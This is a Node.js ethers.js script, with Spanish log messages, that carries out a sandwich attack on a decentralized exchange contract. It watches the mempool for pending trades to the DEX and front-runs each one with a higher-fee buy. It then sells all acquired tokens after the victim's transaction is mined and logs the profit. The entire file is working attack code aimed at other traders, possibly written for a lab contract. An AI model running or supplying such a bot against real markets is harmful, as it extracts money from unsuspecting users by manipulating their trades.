require("dotenv").config();
const { ethers } = require("ethers");

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const attacker = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
const dexAddress = process.env.DEX_ADDRESS.toLowerCase();

const iface = new ethers.Interface([
  "function buy() payable",
  "function sell(uint256)",
  "function balances(address) view returns (uint256)"
]);

const dex = new ethers.Contract(dexAddress, iface, attacker);
const seenTxs = new Set();

async function attackSandwich(targetTx) {
  console.log("🎯 Víctima detectada:", targetTx.hash);

  const ethBefore = await provider.getBalance(attacker.address);

  // FRONT-RUN
  const frontTx = await dex.buy({
    value: ethers.parseEther("1"),
    gasLimit: 300000,
    maxFeePerGas: ethers.parseUnits("30", "gwei"),
    maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
  });
  console.log("🚀 Front-run enviada:", frontTx.hash);
  await frontTx.wait();

  // Esperar que se mine la transacción víctima
  console.log("⌛ Esperando que la víctima se mine...");
  let receipt = null;
  while (!receipt) {
    try {
      receipt = await provider.getTransactionReceipt(targetTx.hash);
    } catch (e) {
      await new Promise((r) => setTimeout(r, 2000));
    }
  }

  // BACK-RUN
  const tokens = await dex.balances(attacker.address);
  const backTx = await dex.sell(tokens);
  console.log("📉 Back-run enviada:", backTx.hash);
  await backTx.wait();

  const ethAfter = await provider.getBalance(attacker.address);
  const profit = ethAfter - ethBefore;

  console.log("💰 Beneficio: ", ethers.formatEther(profit), "ETH");
}

async function monitorMempool() {
  try {
    const pending = await provider.send("eth_pendingTransactions", []);
    for (const tx of pending) {
      if (!tx.to || seenTxs.has(tx.hash)) continue;

      if (tx.to.toLowerCase() === dexAddress && tx.from.toLowerCase() !== attacker.address.toLowerCase()) {
        seenTxs.add(tx.hash);
        await attackSandwich(tx);
      }
    }
  } catch (err) {
    console.error("⛔ Error:", err.message);
  }
}

// Loop cada 2.5 segundos
setInterval(monitorMempool, 2500);

